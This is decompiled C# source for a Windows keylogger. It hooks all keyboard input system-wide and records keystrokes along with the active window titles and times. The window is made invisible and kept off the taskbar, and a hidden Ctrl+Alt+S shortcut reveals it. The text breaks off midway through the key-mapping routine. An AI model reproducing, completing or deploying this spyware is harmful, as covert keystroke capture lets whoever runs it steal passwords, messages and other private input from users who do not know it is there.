using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

public class mainfrm : Form
{
	public struct KBDLLHOOKSTRUCT
	{
		public int vkCode;

		public int scanCode;

		public int flags;

		public int time;

		public int dwExtraInfo;
	}

	public enum virtualKey
	{
		K_Return = 13,
		K_Backspace = 8,
		K_Space = 32,
		K_Tab = 9,
		K_Esc = 27,
		K_Control = 17,
		K_LControl = 162,
		K_RControl = 163,
		K_Delete = 46,
		K_End = 35,
		K_Home = 36,
		K_Insert = 45,
		K_Shift = 16,
		K_LShift = 160,
		K_RShift = 161,
		K_Pause = 19,
		K_PrintScreen = 44,
		K_LWin = 91,
		K_RWin = 92,
		K_Alt = 18,
		K_LAlt = 164,
		K_RAlt = 165,
		K_NumLock = 144,
		K_CapsLock = 20,
		K_Up = 38,
		K_Down = 40,
		K_Right = 39,
		K_Left = 37,
		K_F1 = 112,
		K_F2 = 113,
		K_F3 = 114,
		K_F4 = 115,
		K_F5 = 116,
		K_F6 = 117,
		K_F7 = 118,
		K_F8 = 119,
		K_F9 = 120,
		K_F10 = 121,
		K_F11 = 122,
		K_F12 = 123,
		K_F13 = 124,
		K_F14 = 125,
		K_F15 = 126,
		K_F16 = 127,
		K_F17 = 128,
		K_F18 = 129,
		K_F19 = 130,
		K_F20 = 131,
		K_F21 = 132,
		K_F22 = 133,
		K_F23 = 134,
		K_F24 = 135,
		K_Numpad0 = 96,
		K_Numpad1 = 97,
		K_Numpad2 = 98,
		K_Numpad3 = 99,
		K_Numpad4 = 100,
		K_Numpad5 = 101,
		K_Numpad6 = 102,
		K_Numpad7 = 103,
		K_Numpad8 = 104,
		K_Numpad9 = 105,
		K_Num_Add = 107,
		K_Num_Divide = 111,
		K_Num_Multiply = 106,
		K_Num_Subtract = 109,
		K_Num_Decimal = 110,
		K_0 = 48,
		K_1 = 49,
		K_2 = 50,
		K_3 = 51,
		K_4 = 52,
		K_5 = 53,
		K_6 = 54,
		K_7 = 55,
		K_8 = 56,
		K_9 = 57,
		K_A = 65,
		K_B = 66,
		K_C = 67,
		K_D = 68,
		K_E = 69,
		K_F = 70,
		K_G = 71,
		K_H = 72,
		K_I = 73,
		K_J = 74,
		K_K = 75,
		K_L = 76,
		K_M = 77,
		K_N = 78,
		K_O = 79,
		K_P = 80,
		K_Q = 81,
		K_R = 82,
		K_S = 83,
		K_T = 84,
		K_U = 85,
		K_V = 86,
		K_W = 87,
		K_X = 88,
		K_Y = 89,
		K_Z = 90,
		K_Subtract = 189,
		K_Decimal = 190,
		K_Comma = 188,
		K_Slash = 191,
		K_Dotcomma = 186,
		K_Girshaim1 = 222,
		K_BackSlash = 220,
		K_QScobaLEFT = 219,
		K_QScobaRIGHT = 221,
		K_req = 192,
		K_equal = 187,
		K_backslash2 = 226,
		K_end2 = 35,
		K_PD = 34,
		K_PU = 33,
		K_Home2 = 36,
		K_Insert2 = 45,
		K_scrol = 145,
		K_Pause2 = 19,
		K_num = 144,
		K_slash2 = 111,
		K_star = 106,
		K_plus = 107,
		K_i0 = 96,
		K_i1 = 97,
		K_i2 = 98,
		K_i3 = 99,
		K_i4 = 100,
		K_i5 = 101,
		K_i6 = 102,
		K_i7 = 103,
		K_i8 = 104,
		K_i9 = 105,
		K_Lwindows = 91,
		K_RWindows = 92,
		K_menu = 93
	}

	private delegate int KeyboardHookDelegate(int Code, int wParam, ref KBDLLHOOKSTRUCT lParam);

	public struct RECT
	{
		public int left;

		public int top;

		public int right;

		public int bottom;
	}

	public struct APPBARDATA
	{
		public int cbSize;

		public IntPtr hWnd;

		public int uCallbackMessage;

		public ABEdge uEdge;

		public RECT rc;

		public IntPtr lParam;
	}

	public enum ABMsg
	{
		ABM_NEW,
		ABM_REMOVE,
		ABM_QUERYPOS,
		ABM_SETPOS,
		ABM_GETSTATE,
		ABM_GETTASKBARPOS,
		ABM_ACTIVATE,
		ABM_GETAUTOHIDEBAR,
		ABM_SETAUTOHIDEBAR,
		ABM_WINDOWPOSCHANGED,
		ABM_SETSTATE
	}

	public enum ABNotify
	{
		ABN_STATECHANGE,
		ABN_POSCHANGED,
		ABN_FULLSCREENAPP,
		ABN_WINDOWARRANGE
	}

	public enum ABEdge
	{
		ABE_LEFT,
		ABE_TOP,
		ABE_RIGHT,
		ABE_BOTTOM
	}

	private IContainer components;

	[AccessedThroughProperty("btnStop")]
	private Button _btnStop;

	[AccessedThroughProperty("btnExit")]
	private Button _btnExit;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("btnStart")]
	private Button _btnStart;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("n")]
	private NotifyIcon _n;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("deleteall")]
	private Button _deleteall;

	private const int WM_KEYUP = 257;

	private const short WM_KEYDOWN = 256;

	private const int WM_SYSKEYDOWN = 260;

	private const int WM_SYSKEYUP = 261;

	private IntPtr KeyboardHandle;

	private string LastCheckedForegroundTitle;

	private KeyboardHookDelegate callback;

	private string KeyLog;

	private const int ABM_GETTASKBARPOS = 5;

	private const int WM_SYSCOMMAND = 274;

	private const int SC_MINIMIZE = 61472;

	private string staticsource;

	internal virtual Button btnStop
	{
		get
		{
			return _btnStop;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_btnStop != null)
			{
				((Control)_btnStop).remove_Click((EventHandler)btnStop_Click);
			}
			_btnStop = value;
			if (_btnStop != null)
			{
				((Control)_btnStop).add_Click((EventHandler)btnStop_Click);
			}
		}
	}

	internal virtual Button btnExit
	{
		get
		{
			return _btnExit;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_btnExit != null)
			{
				((Control)_btnExit).remove_Click((EventHandler)btnExit_Click);
			}
			_btnExit = value;
			if (_btnExit != null)
			{
				((Control)_btnExit).add_Click((EventHandler)btnExit_Click);
			}
		}
	}

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick((EventHandler)Timer1_Tick);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick((EventHandler)Timer1_Tick);
			}
		}
	}

	internal virtual Button btnStart
	{
		get
		{
			return _btnStart;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_btnStart != null)
			{
				((Control)_btnStart).remove_Click((EventHandler)btnStart_Click);
			}
			_btnStart = value;
			if (_btnStart != null)
			{
				((Control)_btnStart).add_Click((EventHandler)btnStart_Click);
			}
		}
	}

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual NotifyIcon n
	{
		get
		{
			return _n;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_n != null)
			{
				_n.remove_DoubleClick((EventHandler)Notify_DoubleClick);
			}
			_n = value;
			if (_n != null)
			{
				_n.add_DoubleClick((EventHandler)Notify_DoubleClick);
			}
		}
	}

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click((EventHandler)Button1_Click);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click((EventHandler)Button1_Click);
			}
		}
	}

	internal virtual Timer Timer2
	{
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick((EventHandler)Timer2_Tick);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick((EventHandler)Timer2_Tick);
			}
		}
	}

	internal virtual Button Button2
	{
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Button2 != null)
			{
				((Control)_Button2).remove_Click((EventHandler)Button2_Click);
			}
			_Button2 = value;
			if (_Button2 != null)
			{
				((Control)_Button2).add_Click((EventHandler)Button2_Click);
			}
		}
	}

	internal virtual Button deleteall
	{
		get
		{
			return _deleteall;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_deleteall != null)
			{
				((Control)_deleteall).remove_Click((EventHandler)deleteall_Click);
			}
			_deleteall = value;
			if (_deleteall != null)
			{
				((Control)_deleteall).add_Click((EventHandler)deleteall_Click);
			}
		}
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)new mainfrm());
	}

	public mainfrm()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)frm_Load);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		KeyboardHandle = (IntPtr)0;
		LastCheckedForegroundTitle = "";
		callback = null;
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		//IL_0201: Unknown result type (might be due to invalid IL or missing references)
		//IL_020b: Expected O, but got Unknown
		components = new Container();
		btnStop = new Button();
		btnExit = new Button();
		Timer1 = new Timer(components);
		btnStart = new Button();
		Label1 = new Label();
		n = new NotifyIcon(components);
		Button1 = new Button();
		Timer2 = new Timer(components);
		Button2 = new Button();
		deleteall = new Button();
		((Control)this).SuspendLayout();
		((Control)btnStop).set_Enabled(false);
		Button obj = btnStop;
		Point location = new Point(196, 44);
		((Control)obj).set_Location(location);
		((Control)btnStop).set_Name("btnStop");
		Button obj2 = btnStop;
		Size size = new Size(75, 23);
		((Control)obj2).set_Size(size);
		((Control)btnStop).set_TabIndex(1);
		((ButtonBase)btnStop).set_Text("Stop");
		((ButtonBase)btnStop).set_UseVisualStyleBackColor(true);
		Button obj3 = btnExit;
		location = new Point(91, 44);
		((Control)obj3).set_Location(location);
		((Control)btnExit).set_Name("btnExit");
		Button obj4 = btnExit;
		size = new Size(96, 23);
		((Control)obj4).set_Size(size);
		((Control)btnExit).set_TabIndex(2);
		((ButtonBase)btnExit).set_Text("Exit");
		((ButtonBase)btnExit).set_UseVisualStyleBackColor(true);
		Timer1.set_Enabled(true);
		Timer1.set_Interval(30000);
		Button obj5 = btnStart;
		location = new Point(10, 44);
		((Control)obj5).set_Location(location);
		((Control)btnStart).set_Name("btnStart");
		Button obj6 = btnStart;
		size = new Size(75, 23);
		((Control)obj6).set_Size(size);
		((Control)btnStart).set_TabIndex(3);
		((ButtonBase)btnStart).set_Text("Start");
		((ButtonBase)btnStart).set_UseVisualStyleBackColor(true);
		((Control)Label1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.DarkRed);
		Label label = Label1;
		location = new Point(12, 9);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(259, 33);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(4);
		Label1.set_Text("Not Active");
		Label1.set_TextAlign((ContentAlignment)32);
		n.set_Text(".");
		n.set_Visible(true);
		Button button = Button1;
		location = new Point(196, 94);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(77, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(5);
		((ButtonBase)Button1).set_Text("Hide");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		Timer2.set_Enabled(true);
		Timer2.set_Interval(1800000);
		Button button3 = Button2;
		location = new Point(10, 94);
		((Control)button3).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button4 = Button2;
		size = new Size(75, 23);
		((Control)button4).set_Size(size);
		((Control)Button2).set_TabIndex(6);
		((ButtonBase)Button2).set_Text("Write to file");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		Button obj7 = deleteall;
		location = new Point(94, 74);
		((Control)obj7).set_Location(location);
		((Control)deleteall).set_Name("deleteall");
		Button obj8 = deleteall;
		size = new Size(93, 43);
		((Control)obj8).set_Size(size);
		((Control)deleteall).set_TabIndex(7);
		((ButtonBase)deleteall).set_Text("Delete All Settings...");
		((ButtonBase)deleteall).set_UseVisualStyleBackColor(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(285, 129);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)deleteall);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)btnStart);
		((Control)this).get_Controls().Add((Control)(object)btnExit);
		((Control)this).get_Controls().Add((Control)(object)btnStop);
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("frm");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int UnhookWindowsHookEx(int hHook);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowsHookExA(int idHook, KeyboardHookDelegate lpfn, int hmod, int dwThreadId);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(int vKey);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CallNextHookEx(int hHook, int nCode, int wParam, KBDLLHOOKSTRUCT lParam);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	private string GetActiveWindowTitle()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	private object Hooked()
	{
		return KeyboardHandle != (IntPtr)0;
	}

	public void HookKeyboard()
	{
		callback = KeyboardCallback;
		KeyboardHandle = (IntPtr)SetWindowsHookExA(13, callback, (int)Process.GetCurrentProcess().MainModule!.BaseAddress, 0);
		if (KeyboardHandle != (IntPtr)0)
		{
			((Control)btnStop).set_Enabled(true);
			((Control)btnStart).set_Enabled(false);
			Label1.set_Text("Active");
			((Control)Label1).set_ForeColor(Color.DarkGreen);
		}
	}

	public void UnhookKeyboard()
	{
		if (Conversions.ToBoolean(Hooked()) && UnhookWindowsHookEx((int)KeyboardHandle) != 0)
		{
			Label1.set_Text("Not Active");
			((Control)Label1).set_ForeColor(Color.DarkRed);
			((Control)btnStop).set_Enabled(false);
			((Control)btnStart).set_Enabled(true);
			KeyboardHandle = (IntPtr)0;
		}
	}

	public int KeyboardCallback(int Code, int wParam, ref KBDLLHOOKSTRUCT lParam)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string activeWindowTitle = default(string);
		int num5 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 3531:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0012;
						case 4:
							goto IL_0025;
						case 5:
							goto IL_002f;
						case 6:
						case 7:
							goto IL_0082;
						case 8:
							goto IL_008b;
						case 9:
							goto IL_00a4;
						case 10:
							goto IL_00af;
						case 11:
							goto IL_00df;
						case 12:
							goto IL_00ea;
						case 13:
							goto IL_00fd;
						case 14:
							goto IL_0108;
						case 15:
							goto IL_0118;
						case 16:
							goto IL_0122;
						case 17:
							goto IL_012d;
						case 18:
							goto IL_0138;
						case 19:
						case 20:
						case 21:
							goto IL_0143;
						case 96:
						case 97:
							goto IL_04c5;
						case 64:
						case 65:
							goto IL_04d4;
						case 61:
						case 62:
							goto IL_04e3;
						case 159:
						case 160:
							goto IL_04f2;
						case 73:
						case 74:
							goto IL_0504;
						case 75:
							goto IL_0519;
						case 77:
							goto IL_0528;
						case 78:
							goto IL_052c;
						case 70:
						case 71:
							goto IL_053b;
						case 30:
						case 31:
							goto IL_054a;
						case 147:
						case 148:
							goto IL_0559;
						case 144:
						case 145:
							goto IL_056b;
						case 141:
						case 142:
							goto IL_057d;
						case 150:
						case 151:
							goto IL_058f;
						case 90:
						case 91:
							goto IL_05a1;
						case 93:
						case 94:
							goto IL_05b0;
						case 84:
						case 85:
							goto IL_05bf;
						case 87:
						case 88:
							goto IL_05ce;
						case 153:
						case 154:
							goto IL_05dd;
						case 67:
						case 68:
							goto IL_05ef;
						case 23:
						case 25:
							goto IL_05fe;
						case 27:
						case 28:
							goto IL_0618;
						case 204:
						case 205:
							goto IL_0635;
						case 207:
						case 208:
							goto IL_0647;
						case 210:
						case 211:
							goto IL_0659;
						case 174:
						case 175:
							goto IL_066b;
						case 177:
						case 178:
							goto IL_067d;
						case 180:
						case 181:
							goto IL_068f;
						case 183:
						case 184:
							goto IL_06a1;
						case 186:
						case 187:
							goto IL_06b3;
						case 189:
						case 190:
							goto IL_06c5;
						case 192:
						case 193:
							goto IL_06d7;
						case 195:
						case 196:
							goto IL_06e9;
						case 198:
						case 199:
							goto IL_06fb;
						case 201:
						case 202:
							goto IL_070d;
						case 168:
						case 169:
							goto IL_071f;
						case 171:
						case 172:
							goto IL_0731;
						case 165:
						case 166:
							goto IL_0743;
						case 81:
						case 82:
							goto IL_0755;
						case 162:
						case 163:
							goto IL_077c;
						case 156:
						case 157:
							goto IL_078e;
						case 54:
						case 55:
							goto IL_07a0;
						case 57:
							goto IL_07b9;
						case 58:
							goto IL_07bd;
						case 33:
						case 34:
							goto IL_07cc;
						case 36:
							goto IL_07e5;
						case 37:
							goto IL_07e9;
						case 40:
						case 41:
							goto IL_07f8;
						case 43:
							goto IL_0811;
						case 44:
							goto IL_0815;
						case 47:
						case 48:
							goto IL_0824;
						case 50:
							goto IL_083d;
						case 51:
							goto IL_0841;
						case 117:
						case 118:
							goto IL_0850;
						case 135:
						case 136:
							goto IL_085f;
						case 111:
						case 112:
							goto IL_0871;
						case 102:
						case 103:
							goto IL_0880;
						case 99:
						case 100:
							goto IL_088f;
						case 114:
						case 115:
							goto IL_089e;
						case 132:
						case 133:
							goto IL_08ad;
						case 126:
						case 127:
							goto IL_08bf;
						case 123:
						case 124:
							goto IL_08ce;
						case 129:
						case 130:
							goto IL_08dd;
						case 120:
						case 121:
							goto IL_08ef;
						case 213:
						case 214:
							goto IL_08fe;
						case 138:
						case 139:
							goto IL_0916;
						case 217:
							goto IL_0928;
						case 218:
							goto IL_0942;
						case 230:
						case 231:
							goto IL_0974;
						case 220:
						case 222:
							goto IL_0983;
						case 224:
						case 225:
							goto IL_0992;
						case 227:
						case 228:
							goto IL_09a1;
						case 22:
						case 26:
						case 29:
						case 32:
						case 35:
						case 38:
						case 39:
						case 42:
						case 45:
						case 46:
						case 49:
						case 52:
						case 53:
						case 56:
						case 59:
						case 60:
						case 63:
						case 66:
						case 69:
						case 72:
						case 76:
						case 79:
						case 80:
						case 83:
						case 86:
						case 89:
						case 92:
						case 95:
						case 98:
						case 101:
						case 104:
						case 107:
						case 110:
						case 113:
						case 116:
						case 119:
						case 122:
						case 125:
						case 128:
						case 131:
						case 134:
						case 137:
						case 140:
						case 143:
						case 146:
						case 149:
						case 152:
						case 155:
						case 158:
						case 161:
						case 164:
						case 167:
						case 170:
						case 173:
						case 176:
						case 179:
						case 182:
						case 185:
						case 188:
						case 191:
						case 194:
						case 197:
						case 200:
						case 203:
						case 206:
						case 209:
						case 212:
						case 215:
						case 216:
						case 219:
						case 223:
						case 226:
						case 229:
						case 232:
						case 233:
						case 234:
							goto IL_09ae;
						case 235:
							goto end_IL_0000_2;
						case 105:
						case 106:
							num = 106;
							text = "-";
							goto IL_09ae;
						case 108:
						case 109:
							num = 109;
							text = "-";
							goto IL_09ae;
						default:
							goto end_IL_0000;
						case 236:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_09ae:
					num = 234;
					KeyLog += text;
					break;
					IL_0008:
					num = 2;
					activeWindowTitle = GetActiveWindowTitle();
					goto IL_0012;
					IL_0012:
					num = 3;
					if (Operators.CompareString(activeWindowTitle, LastCheckedForegroundTitle, false) != 0)
					{
						goto IL_0025;
					}
					goto IL_0082;
					IL_0025:
					num = 4;
					LastCheckedForegroundTitle = activeWindowTitle;
					goto IL_002f;
					IL_002f:
					num = 5;
					KeyLog = KeyLog + "\r\n----------- " + activeWindowTitle + " (" + DateAndTime.get_Now().ToString() + ") ------------\r\n";
					goto IL_0082;
					IL_0082:
					num = 7;
					text = "";
					goto IL_008b;
					IL_008b:
					num = 8;
					if (wParam == 256 || wParam == 260)
					{
						goto IL_00a4;
					}
					goto IL_0928;
					IL_00a4:
					num = 9;
					if (Code >= 0)
					{
						goto IL_00af;
					}
					goto IL_0143;
					IL_00af:
					num = 10;
					if (((Computer)MyProject.Computer).get_Keyboard().get_CtrlKeyDown() & ((Computer)MyProject.Computer).get_Keyboard().get_AltKeyDown() & (lParam.vkCode == 83))
					{
						goto IL_00df;
					}
					goto IL_0143;
					IL_00df:
					num = 11;
					((Control)this).set_Visible(true);
					goto IL_00ea;
					IL_00ea:
					num = 12;
					((Form)this).set_Opacity(100.0);
					goto IL_00fd;
					IL_00fd:
					num = 13;
					((Form)this).set_WindowState((FormWindowState)0);
					goto IL_0108;
					IL_0108:
					num = 14;
					n.set_Visible(false);
					goto IL_0118;
					IL_0118:
					num = 15;
					((Control)this).Show();
					goto IL_0122;
					IL_0122:
					num = 16;
					AnimateWindow(ToTray: false);
					goto IL_012d;
					IL_012d:
					num = 17;
					((Form)this).set_ShowInTaskbar(true);
					goto IL_0138;
					IL_0138:
					num = 18;
					num5 = 1;
					goto end_IL_0000_3;
					IL_0143:
					num = 21;
					switch (lParam.vkCode)
					{
					case 8:
						break;
					case 9:
						goto IL_04d4;
					case 13:
						goto IL_04e3;
					case 19:
						goto IL_04f2;
					case 20:
						goto IL_0504;
					case 27:
						goto IL_053b;
					case 32:
						goto IL_054a;
					case 33:
						goto IL_0559;
					case 34:
						goto IL_056b;
					case 35:
						goto IL_057d;
					case 36:
						goto IL_058f;
					case 37:
						goto IL_05a1;
					case 38:
						goto IL_05b0;
					case 39:
						goto IL_05bf;
					case 40:
						goto IL_05ce;
					case 45:
						goto IL_05dd;
					case 46:
						goto IL_05ef;
					case 48:
					case 49:
					case 50:
					case 51:
					case 52:
					case 53:
					case 54:
					case 55:
					case 56:
					case 57:
						goto IL_05fe;
					case 65:
					case 66:
					case 67:
					case 68:
					case 69:
					case 70:
					case 71:
					case 72:
					case 73:
					case 74:
					case 75:
					case 76:
					case 77:
					case 78:
					case 79:
					case 80:
					case 81:
					case 82:
					case 83:
					case 84:
					case 85:
					case 86:
					case 87:
					case 88:
					case 89:
					case 90:
						goto IL_0618;
					case 91:
						goto IL_0635;
					case 92:
						goto IL_0647;
					case 93:
						goto IL_0659;
					case 96:
						goto IL_066b;
					case 97:
						goto IL_067d;
					case 98:
						goto IL_068f;
					case 99:
						goto IL_06a1;
					case 100:
						goto IL_06b3;
					case 101:
						goto IL_06c5;
					case 102:
						goto IL_06d7;
					case 103:
						goto IL_06e9;
					case 104:
						goto IL_06fb;
					case 105:
						goto IL_070d;
					case 106:
						goto IL_071f;
					case 107:
						goto IL_0731;
					case 111:
						goto IL_0743;
					case 112:
					case 113:
					case 114:
					case 115:
					case 116:
					case 117:
					case 118:
					case 119:
					case 120:
					case 121:
					case 122:
					case 123:
					case 124:
					case 125:
					case 126:
					case 127:
					case 128:
					case 129:
					case 130:
					case 131:
					case 132:
					case 133:
					case 134:
					case 135:
						goto IL_0755;
					case 144:
						goto IL_077c;
					case 145:
						goto IL_078e;
					case 160:
					case 161:
						goto IL_07a0;
					case 162:
					case 163:
						goto IL_07cc;
					case 164:
						goto IL_07f8;
					case 165:
						goto IL_0824;
					case 186:
						goto IL_0850;
					case 187:
						goto IL_085f;
					case 188:
						goto IL_0871;
					case 109:
					case 189:
						goto IL_0880;
					case 110:
					case 190:
						goto IL_088f;
					case 191:
						goto IL_089e;
					case 192:
						goto IL_08ad;
					case 219:
						goto IL_08bf;
					case 220:
						goto IL_08ce;
					case 221:
						goto IL_08dd;
					case 222:
						goto IL_08ef;
					default:
						goto IL_08fe;
					case 226:
						goto IL_0916;
					}
					goto IL_04c5;
					IL_0916:
					num = 139;
					text = "\\";
					goto IL_09ae;
					IL_08fe:
					num = 214;
					text = Conversions.ToString(lParam.vkCode);
					goto IL_09ae;
					IL_08ef:
					num = 121;
					text = "'";
					goto IL_09ae;
					IL_08dd:
					num = 130;
					text = "]";
					goto IL_09ae;
					IL_08ce:
					num = 124;
					text = "\\";
					goto IL_09ae;
					IL_08bf:
					num = 127;
					text = "[";
					goto IL_09ae;
					IL_08ad:
					num = 133;
					text = "`";
					goto IL_09ae;
					IL_089e:
					num = 115;
					text = "/";
					goto IL_09ae;
					IL_088f:
					num = 100;
					text = ".";
					goto IL_09ae;
					IL_0880:
					num = 103;
					text = "-";
					goto IL_09ae;
					IL_0871:
					num = 112;
					text = ",";
					goto IL_09ae;
					IL_085f:
					num = 136;
					text = "=";
					goto IL_09ae;
					IL_0850:
					num = 118;
					text = ";";
					goto IL_09ae;
					IL_0824:
					num = 48;
					if (!KeyLog.EndsWith("[RALT]"))
					{
						goto IL_083d;
					}
					goto IL_09ae;
					IL_083d:
					num = 50;
					goto IL_0841;
					IL_0841:
					num = 51;
					text = "[RALT]";
					goto IL_09ae;
					IL_07f8:
					num = 41;
					if (!KeyLog.EndsWith("[ALT]"))
					{
						goto IL_0811;
					}
					goto IL_09ae;
					IL_0811:
					num = 43;
					goto IL_0815;
					IL_0815:
					num = 44;
					text = "[ALT]";
					goto IL_09ae;
					IL_07cc:
					num = 34;
					if (!KeyLog.EndsWith("[CTRL]"))
					{
						goto IL_07e5;
					}
					goto IL_09ae;
					IL_07e5:
					num = 36;
					goto IL_07e9;
					IL_07e9:
					num = 37;
					text = "[CTRL]";
					goto IL_09ae;
					IL_07a0:
					num = 55;
					if (!KeyLog.EndsWith("[SHFT]"))
					{
						goto IL_07b9;
					}
					goto IL_09ae;
					IL_07b9:
					num = 57;
					goto IL_07bd;
					IL_07bd:
					num = 58;
					text = "[SHFT]";
					goto IL_09ae;
					IL_078e:
					num = 157;
					text = "[ScrLk]";
					goto IL_09ae;
					IL_077c:
					num = 163;
					text = "[NumLock]";
					goto IL_09ae;
					IL_0755:
					num = 82;
					text = "[F" + Conversions.ToString(checked(lParam.vkCode - 111)) + "]";
					goto IL_09ae;
					IL_0743:
					num = 166;
					text = "/";
					goto IL_09ae;
					IL_0731:
					num = 172;
					text = "+";
					goto IL_09ae;
					IL_071f:
					num = 169;
					text = "*";
					goto IL_09ae;
					IL_070d:
					num = 202;
					text = "9";
					goto IL_09ae;
					IL_06fb:
					num = 199;
					text = "8";
					goto IL_09ae;
					IL_06e9:
					num = 196;
					text = "7";
					goto IL_09ae;
					IL_06d7:
					num = 193;
					text = "6";
					goto IL_09ae;
					IL_06c5:
					num = 190;
					text = "5";
					goto IL_09ae;
					IL_06b3:
					num = 187;
					text = "4";
					goto IL_09ae;
					IL_06a1:
					num = 184;
					text = "3";
					goto IL_09ae;
					IL_068f:
					num = 181;
					text = "2";
					goto IL_09ae;
					IL_067d:
					num = 178;
					text = "1";
